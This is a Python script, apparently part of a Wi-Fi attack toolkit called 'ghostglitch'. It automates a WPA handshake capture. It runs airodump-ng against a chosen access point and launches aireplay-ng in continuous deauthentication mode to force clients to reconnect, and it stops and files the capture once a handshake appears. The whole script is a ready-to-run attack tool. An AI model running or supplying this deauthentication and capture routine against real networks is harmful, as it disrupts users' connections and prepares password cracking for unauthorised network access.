#!/usr/bin/python
# -*- coding: UTF-8 -*-

# python scripts/C_captureHandshake.py wlan0mon C2:94:AD:CC:FC:60 52
# iBrokenShadow 
# Made by Broken Shadow

import psutil
import subprocess
import time
import csv
import pandas as pd
import os
import shutil
import sys
import signal
import threading
from X_requirement import check_installation
requirements_satisfied = check_installation()

# Console colors
W = '\033[37m'          # white (normal)
GR = '\033[32m'         # white (normal)
R = '\033[31m'          # red
G = '\033[32m'          # green
O = '\033[38;5;208m'    # orange
Y = '\033[33m'          # Yellow
B = '\033[34m'          # blue
P = '\033[35m'          # purple
C = '\033[36m'          # cyan

def bann_text():
    clear()
    logo = """ 
    ░██████╗░██╗░░██╗░█████╗░░██████╗████████╗░░░░░░░██████╗░██╗░░░░░██╗████████╗░█████╗░██╗░░██╗
    ██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝░░░░░░██╔════╝░██║░░░░░██║╚══██╔══╝██╔══██╗██║░░██║
    ██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░█████╗██║░░██╗░██║░░░░░██║░░░██║░░░██║░░╚═╝███████║
    ██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░╚════╝██║░░╚██╗██║░░░░░██║░░░██║░░░██║░░██╗██╔══██║
    ╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░░░░░░░╚██████╔╝███████╗██║░░░██║░░░╚█████╔╝██║░░██║
    ░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░░░░░╚═════╝░╚══════╝╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
    
    """
    print(logo)
    
def run(cmd):
    subprocess.run(cmd)

# REQUIREMENTS
def requirements():
    try:
        if requirements_satisfied == False:
            clear() ; print(R) ; run(["figlet", "ERROR !!!"])
            print("\n\nMake Sure to Satisfy all Requirement First...")
            print(GR) ; input() ; sys.exit(0)
    except KeyboardInterrupt: sys.exit(0)
    except: sys.exit(0)
    
    

subprocess.run("clear")

def is_run_with_sudo():
    return os.geteuid() == 0

if is_run_with_sudo() == False:
    print("ERROR!!!\n\nPlease run with sudo privileges...\n\n")
    print("\n") ; input("Press Any Key to quit...")
    sys.exit()

# Variables Passed from 1st Program
try:
    INTERFACE = sys.argv[1]
    BSSID = sys.argv[2]
    CHANNEL = sys.argv[3]
    PythonFilepath = sys.argv[4]
except:
    print("SYNTAX ERROR!!!\n\nexample:\n\tpython -u \"scriptName.py\" 'interface-name' 'BSSID' 'CHANNEL' \"PATH TO ghostglitch.py File\"")
    print("\n") ; 
    try: input("Press Any Key to quit...")
    except KeyboardInterrupt: sys.exit(0)
    sys.exit(0)
    

def exit_pause():
    print("\n") ; input("Press Any Key to quit...") ; clear() #; exit()
    subprocess.run("python captureHandshake.py")

def Del_Current_Line():
    sys.stdout.write("\r\033[K")
    sys.stdout.flush()

def Del_Pre_Line():
    print("\033[F\033[K", end="", flush=True)

# CLEAR SCREEN
def clear():
    subprocess.run("clear")




# SIMPLE ANIMATION
def loading_animation(text):
    chars = "/—\|"  # Characters for the animation
    start_time = time.time()
    while time.time() - start_time < 2:
        for char in chars:
            sys.stdout.write('\r' + text + char)
            sys.stdout.flush()
            time.sleep(0.1)
            
# Slowly Type something instead of sudden print   
def SlowType(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)
    print()  # Print a newline after printing the sentence slowly

  


# Check if Monitor Mode is already Enabled
def is_monitor_mode_enabled(interface):
    try:
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            return True
        else:
            return False
    except subprocess.CalledProcessError as e:
        print(f"Error checking monitor mode for {interface}: {e}")
        return False


# # MONITOR MODE DISABLE
# def disable_monitor_mode(interface):
#     x =0
    
# # USER RESPONSE ON DISBALING MONITOR MODE
# def DoIdisable(interface):
#     try:
#         user_input = input("(( Disable Monitor Mode? (y/n) ))  ") ; Del_Pre_Line()
#         if len(user_input) != 1:
#             print("ERROR! Input must be a single character...")
#             exit_pause()
            
#         # Process the input here
#         if user_input.lower() == 'y':
#             # IF MONITOR MORE IS ALREADY DISABLED THERE
#             monitor_mode_enabled = is_monitor_mode_enabled(interface)
#             if monitor_mode_enabled == False:
#                 loading_animation("Wait... ") ; Del_Current_Line()
#                 print(f"Monitor Mode is already Disabled on interface : {interface}\n")
                
#                 time.sleep(1) ; print("-----" *5)
#                 subprocess.run(["iwconfig", interface])
#                 print("-----" *5) ; exit_pause()
#             else:
#                 disable_monitor_mode(interface)
            
#     except ValueError as e:
#         print("Error:", e)
#         exit_pause()
    


#------------------------------------------------------------------------------------------------------
# global rest
# # Function to handle KeyboardInterrupt
# def handle_interrupt(signum, frame):
#     # Terminate command 2
#     print("Ctrl+C detected. Terminating processes...")
#     proc2.terminate()

    


# IGNORE
def backToMain():
    a = 1

def MonitorModeDisbaled_RedirectProgramA(monitorModeFile):
    check = is_monitor_mode_enabled(INTERFACE)
    if check == False:
        clear() ; print(f"MONITOR MODE IS DISBALED ON '{INTERFACE}'\n.\n.\n.\n")
        loading_animation("Wait... Turning On Monitor Mode") ; Del_Current_Line() ; clear()

        subprocess.run(['sudo', 'python', monitorModeFile])
        sys.exit()
        
        
# Get Connected Client's BSSIDs for Deauthentication attack on each clients that get connected        
def get_connected_clients_from_csv(csv_file):
    with open(csv_file, 'r') as file:
        # Skip first 4 lines
        for _ in range(5):
            next(file)
        # Extract client BSSIDs from the first column
        connected_clients = [line.split(',')[0].strip() for line in file]
    return connected_clients


#######################################################################################################
def PostMain():
    try:
        subprocess.run("clear")
        print(output_lines)
        lines = (CountCSVLines(CAPfileName+"-01.csv")) + 6 ; i = 0
        
        # CHECK IF HANDSHAKE ACTUALLY CAPTURED OR NOT
        if retVAL == True:
            while i<lines: 
                print("\n") ; i+=1
            print(" HANDSHAKE CAPTURED")
            print(f"\n Captured Files are stored in : \n \"{path}\"\n\n Press Enter to Close...\n\n")
            
        if retVAL == False:
            print("\n\n ERROR! HANDSHAKE NOT CAPTURED...\n Try Again...\n\n")
            print(f" Captured Files are stored in : \n \"{path}\"")
            
        input()
    except KeyboardInterrupt:
        print("\n\nBYE")
    except Exception as e: 
        subprocess.run("clear")
        print(f"ERROR: {e}") ; input()

#######################################################################################################

def CountCSVLines(CapturedCSV_File):
    try:
        with open(CapturedCSV_File, "r") as file:
            line_count = sum(1 for _ in file)
            return line_count
    except:
        subprocess.run("clear")
        print("ERROR! File Not Found...") ; sys.exit(0)



# MOVE ALL FILES TO PATH
def moveFilestoPath(files):
    try:
        for file in files:
            shutil.move(file, path)
            
    except KeyboardInterrupt: 
        subprocess.run("clear")
        print("\n\nBYE") ; sys.exit(0)


#######################################################################################################
#                                                                                                     #
#######################################################################################################
# MAIN FUNCTION
# Get path exact name where the script is stored

try:
    RES = 0 ; requirements()
    # PythonFilepath = os.path.abspath(os.path.dirname(__file__)) + "/"
    current_directory = os.getcwd() + "/"
    MonitorModeDisbaled_RedirectProgramA(PythonFilepath + "A_monitorMode.py")

    CSVfilePath = PythonFilepath + "airodumped_BS_list-01.csv"
    path = PythonFilepath + "CaptureHandshake_BS" + "/"
    CAPfileName = path + "CaptureHandshakke_BS_list"
    
    files = [current_directory+"CaptureHandshakke_BS_list-01.csv", current_directory+"CaptureHandshakke_BS_list-01.cap", current_directory+"CaptureHandshakke_BS_list-01.log.csv", current_directory+"CaptureHandshakke_BS_list-01.kismet.csv", current_directory+"CaptureHandshakke_BS_list-01.kismet.netxml"]
    filesH = [CAPfileName+"-01.csv", CAPfileName+"-01.cap", CAPfileName+"-01.log.csv", CAPfileName+"-01.kismet.csv", CAPfileName+"-01.kismet.netxml"]
    
    # Remove All files Necessary and Create the Folder to place all files
    try:
        for file in files: os.remove(file)
    except: pass
    try:
        for fileh in filesH: os.remove(fileh)
    except: pass
    
    try:
        result = subprocess.run(['sudo', 'rm', '-r', path]) 
        result = subprocess.run(['sudo', 'mkdir', path])
    except: pass
    subprocess.run("clear")
    
    # CAPTURE COMMAND STARTS    
    global retVAL ; retVAL = False

    # Command 1: Run airodump-ng in the current terminal
    proc1 = subprocess.Popen(["airodump-ng", "--bssid", BSSID, "--channel", CHANNEL, INTERFACE, "--write", "CaptureHandshakke_BS_list", '--write-interval', '1', '--ignore-negative-one'], stdout=subprocess.PIPE, text=True)
    RES = 1
    # print(["airodump-ng", "--bssid", BSSID, "--channel", CHANNEL, INTERFACE, "--write", "CaptureHandshakke_BS_list", '--write-interval', '1', '--ignore-negative-one'])
    # input()
    # Command 2: Run aireplay-ng in a new xterm window
    aireplay_command = [
        "xterm",
        "-e",
        f"aireplay-ng -0 0 -a {BSSID} {INTERFACE}"
    ]
    proc2 = subprocess.Popen(aireplay_command)


    output_lines = ""
    # Monitor output of command 1
    while True:
        line = proc1.stdout.readline().strip()
        output_lines += line + "\n"
        
        print(line)  # Print the output of command 1
        if "handshake" in line.lower():  # Check if the word "handshake" is in the line
            proc2.terminate()
            proc1.terminate()
            retVAL = True
            break
    
        
    subprocess.run("clear")
    if RES==1: 
        moveFilestoPath(files)
        PostMain()
    sys.exit(0)
    
except KeyboardInterrupt:
    subprocess.run("clear")
    if RES==1: 
        moveFilestoPath(files)
        PostMain()
    sys.exit(0)
    
except Exception as e:
    subprocess.run("clear")
    print(f"ERROR: {e}") ; input()
